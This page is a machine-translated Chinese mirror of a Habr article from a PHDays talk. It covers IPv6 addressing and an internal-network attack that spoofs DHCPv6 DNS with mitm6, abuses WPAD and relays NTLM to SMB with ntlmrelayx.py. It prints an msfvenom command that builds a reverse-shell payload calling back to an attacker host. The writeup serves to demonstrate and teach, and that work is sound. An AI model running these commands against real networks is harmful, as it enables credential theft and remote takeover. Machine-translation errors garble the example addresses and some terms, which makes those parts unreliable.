<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🕣 📌 🚀 在IPv6中何处插入引号 ✋ 🖋️ 🤘</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="IPv6是Internet协议的新版本。 IETF成员仅在22年前的1996年接受了它。 在这段时间内，特定的IPv6攻击设法出现了。 基于我们在PHDays 8上的演讲，本文的目的是展示内部入侵者使用IPv4和IPv6攻击公司网络的可能性。 



 IPv6寻址基础 
 IPv6地址的长度为12...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>在IPv6中何处插入引号</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pm/blog/417285/"> IPv6是Internet协议的新版本。  IETF成员仅在22年前的1996年接受了它。 在这段时间内，特定的IPv6攻击设法出现了。 基于我们在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">PHDays 8</a>上的演讲，本文的目的是展示内部入侵者使用IPv4和IPv6攻击公司网络的可能性。 <br><br><img src="https://habrastorage.org/webt/ls/nb/b7/lsnbb7p7odub6aicoy6uylbvcak.png"><br><a name="habracut"></a><br><h2>  IPv6寻址基础 </h2><br>  IPv6地址的长度为128位，以十六进制格式写入，并将整个地址分为8组。 编写IPv6地址的示例： <br><br>  2001：0a00：咖啡厅：贝贝：0001：0000：0000：0011/64 <br><br> 当几个后续的零组可以用“ ::”代替，但只能替换一次时，地址记录就会简化。 每个组中写入左侧的零都可以丢弃。 因此，以上地址可以写为： <br><br>  2001：a00：咖啡厅：宝贝：1 :: 11/64 <br><br> 提供者发布给客户端的主机部分的标准大小为64位，其中4位用于将网络划分为子网。 <br><br><img src="https://habrastorage.org/webt/ae/0r/2b/ae0r2bmvkfpwm8bvbwdlui_560i.png"><br><br>  IPv6中有几种类型的地址： <br><br><img src="https://habrastorage.org/webt/cr/e2/zz/cre2zzzair09k_qyg-ozm_olyno.png"><br>  <b>全球单播</b>是IPv4中公共地址的类似物。 这些地址由<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">IANA</a>发布，在整个Internet上都是唯一的。 这些地址的范围是2000 :: / 3（2000-3FFF）。 <br><br>  <b>本地地址（Link-local）</b> -FE80 :: / 10（FE80-FEBF）范围内的地址由设备自动生成，并用于与同一本地网络上的其他设备进行交互。 包含该地址作为发送者或接收者的流量不应路由。 因此，支持IPv6并连接到网络的设备无需任何配置即可立即在其子网内交换信息。 <br><br>  <b>回送地址:: 1</b> 。 该地址类似于IPv4中的127.0.0.1。 发送给它的数据包不会离开设备。 <br><br>  <b>未指定地址</b> -地址“ ::”，仅包含零。 在某些情况下，它一直用作发件人，直到收到地址为止。 <br><br>  <b>唯一本地地址（Unique local）</b> -IPv4中专用地址的类似物，可以在组织的内部网络中路由，而不必路由到Internet。  IPv6地址空间是如此之大，以至于可以向地球上的每个人发出超过一万亿个地址，并且它们不会终止。 因此，由于缺少公共地址，IPv6意味着在IPv4中使用私有地址的意义上，私有地址的放弃。 <br><br>  <b>映射到IPv6的IPv4地址（嵌入式IPv4）</b> -以:: ffff开头的IPv6地址：其后32位包含IPv4地址（:: ffff：xxxx：xxxx，其中xxxx：xxxx是转换为十六进制的IPv4地址）。 这些地址用于不支持IPv6的设备，并提供将IPv4地址空间映射到IPv6地址空间的方法。 <br><br>  <b>组播地址（Multicast）</b> -与IPv4相比，IPv6的主要变化之一。 新协议拒绝了广播数据包，而不是使用广播地址多播地址。 所有这些地址都在FF00 :: / 8的范围内 <br><br><img src="https://habrastorage.org/webt/gw/io/c6/gwioc6toxuatii_wzugt5yb3j2w.png"><br><br><h3>  IPv6地址分配 </h3><br>  IPv6使用ICMPv6邻居发现协议（ND）获得地址信息。 如下图所示，当新设备出现在IPv6网络上时，该设备会向“ ff02 :: 2”（所有网络路由器）发送一个获取IPv6地址的请求（路由器请求）。 路由器以（路由器广告）消息作为响应，该消息包含有关如何获取IPv6地址的信息。 根据消息中设置的标志，有以下三种方法： <br><table><tbody><tr><th> 获取地址的方式 </th><th>  （自动）标志 </th><th>  O（其他）标志 </th><th>  M（托管）标志 </th></tr><tr><td>  SLAAC（默认） </td><td>  1个 </td><td>  0 </td><td>  0 </td></tr><tr><td>  SLAAC + DHCPv6 </td><td>  1个 </td><td>  1个 </td><td>  0 </td></tr><tr><td>  DHCPv6 </td><td>  0 </td><td>  -- </td><td>  1个 </td></tr></tbody></table><br>  <b>SLAAC</b> （无状态地址自动配置）-在这种情况下，生成全局IPv6地址所需的一切都在RA消息中。 <br><br>  <b>SLAAC + DHCPv6-</b>与SLAAC一样，地址是根据RA数据包中的信息生成的，但是会额外设置O标志，这意味着进行其他配置，并且设备必须与DHCPv6服务器联系以获得其他设置，例如DNS服务器。 <br><br>  <b>DHCPv6</b>是DHCPv4地址的类似物，所有其他信息均由DHCP服务器发布，但默认网关除外，该默认网关取自RA数据包的发件人地址。 <br><br> 当同时设置O和M标志时，将忽略O标志。 <br><br><img src="https://habrastorage.org/webt/qx/nh/yw/qxnhywmpu6bpogmnss7c0emprpa.jpeg"><br> 例如，以<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">thc-ipv6</a>实用程序<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">套件中</a>的fake_router26实用程序为例。 该图显示，启动后，添加了默认网关的IPv6地址，该地址成为优先于IPv4的地址。 <br><br><img src="https://habrastorage.org/webt/mr/qc/45/mrqc45-7fxz_clcr6affsl69i9e.png"><br><br><h2> 进攻！ </h2><br> 在这种情况下，我们将考虑使用获取IPv6网络设置的机制进行中间人攻击的可能性。 <br><br> 为了演示，我们需要4辆车： <br><br>  <b>攻击者机器是</b> Kali Linux。 <br><br><img src="https://habrastorage.org/webt/2z/rj/2p/2zrj2parlezr5m5thp1abcskgxo.png"><br><br>  <b>将</b>在其上打开Windows 7管理球<b>的服务器计算机</b> 。 <br><br><img src="https://habrastorage.org/webt/tl/n3/qj/tln3qjafwp_zhancgxbpogpd5u4.png"><br><br> 可以访问Windows 7服务器的<b>客户端计算机</b> 。 <br><br><img src="https://habrastorage.org/webt/ob/vb/82/obvb82baad3u7bd4cmjlm-54atc.png"><br><br> 启用了DHCPv4的路由器。 <br><br>  dirkjanm描述了此方案的<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">方法</a> 。 他编写了mitm6实用程序，该实用程序使用ND协议发送“ O”和“ M”标志设置为“ 1”的路由器公告消息。 因此，客户端知道有必要从DHCPv6服务器请求地址信息。 客户端开始发送DHCPv6 SOLICIT消息以发现DHCP服务器。 该实用程序以DHCPv6 ADVERTISE消息响应请求。 响应包含作为DNS服务器的攻击机的地址。 <br><br><img alt="请求将地址信息发送到所有DHCP服务器的多播地址ff02 :: 1：2" src="https://habrastorage.org/webt/ze/if/di/zeifdiuqvmjxgmsakw5nz5dqqau.png"><br><br> 之后，由于操作系统的体系结构功能，DHCPv6 DNS成为优先事项。 现在，攻击者可以使用正确的地址响应任何DNS查询。 因此，域名发送的请求将被发送给攻击者自己的判断力。 <br><br> 通过运行mitm6，您可以指定要替换DNS地址的域。 <br><br><img src="https://habrastorage.org/webt/cj/b5/mt/cjb5mthduecqu62-iig9ed9u24w.png"><br><br><img src="https://habrastorage.org/webt/ox/bz/bu/oxbzbuxhk777trjsfvr4idkkgdw.png"><br><br><h2> 管理球 </h2><br> 为了增强戏剧效果，假设网络上存在另一台允许第一台计算机的用户连接到管理球的计算机。 默认情况下，它们是关闭的，但是在Internet上，很多人都对如何打开它们感兴趣，并且对它们打开时感到非常高兴。 <br><br><img src="https://habrastorage.org/webt/gi/yj/qt/giyjqt4gwprslmxgsgc_i2b_5_k.jpeg"><br><br><img src="https://habrastorage.org/webt/d-/gg/mp/d-ggmpf_b9oztu5dfrotewmbw9o.png"><br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">WPAD</a> （Web代理自动发现）是一种协议，用于确定默认代理设置所在的文件的位置。 <br><br> 更新<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">MS16-077之后，</a>将不再通过NETBIOS给予<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">wpad，</a>并且不会在代理服务器上自动对其进行身份验证。 <br><br> 要绕过这些限制，您可以使用impacket的一部分ntlmrelayx.py。 需要高于0.9.16的版本，其中包括IPv6支持和安装呈现有效wpad的服务器的功能。 发射由团队完成 <br><br><pre><code class="bash hljs">ntlmrelayx.py -6 -wh at.localdomain -t smb://192.168.56.7 -e 1.exe</code> </pre> <br> 其中1.exe是元拆分生成的反向Shell负载。 <br><br><pre> <code class="bash hljs">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.6 LPORT=444 -f exe -o 1.exe</code> </pre> <br>  -wh参数指示wpad文件所在的主机（mitm6实用程序将使用攻击者的地址来响应此请求） <br><br><img src="https://habrastorage.org/webt/4e/ew/hh/4eewhhpvwjynispsnazoyftxtus.png"><br><br><img src="https://habrastorage.org/webt/p1/it/aa/p1itaa9idtzcavemj45sgzsbeeq.png"><br><br> 连接后，将请求HTTP 407（需要代理身份验证）身份验证，浏览器将自动对其进行身份验证。 <br><br><img src="https://habrastorage.org/webt/fw/hn/qz/fwhnqzgqri-snconlo2sdpubcmc.png"><br><br><img src="https://habrastorage.org/webt/f5/hf/1x/f5hf1xuyeourcueod8v70dqilsa.png"><br><br> 接收到的数据将通过-t参数用于连接到受攻击服务器的smb。 <br><br><img src="https://habrastorage.org/webt/xa/hu/0e/xahu0errtgiiuzu9j_b1990pryq.png"><br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/WO2jeo85Mpg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br> 感谢我的合著者Sergey Ovchinnikov <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" class="user_link">malchikserega</a>在准备演示文稿和文章时提供的帮助。 </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN417285/">https://habr.com/ru/post/zh-CN417285/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN417271/index.html">黑客可以封锁英吉利海峡吗？</a></li>
<li><a href="../zh-CN417273/index.html">基于YandexSpeechKit的语音向导的实现</a></li>
<li><a href="../zh-CN417275/index.html">有效设计师的7个技能。 强大的职业发展工具</a></li>
<li><a href="../zh-CN417277/index.html">免费库，用于创建和编辑PDF文件</a></li>
<li><a href="../zh-CN417283/index.html">迪士尼推出了自己的HairControl头发动画系统</a></li>
<li><a href="../zh-CN417287/index.html">7月的“测试者日历”。 分析测试</a></li>
<li><a href="../zh-CN417289/index.html">学员日记：第1天。初级学员</a></li>
<li><a href="../zh-CN417293/index.html">云中的密码恢复和主存储，或Zimbra 8.8.9的新增功能</a></li>
<li><a href="../zh-CN417295/index.html">我如何编写标准的C ++ 11库，或者为什么boost如此令人恐惧。 第三章</a></li>
<li><a href="../zh-CN417297/index.html">恐惧和厌恶威胁情报或8个TI实用技巧</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>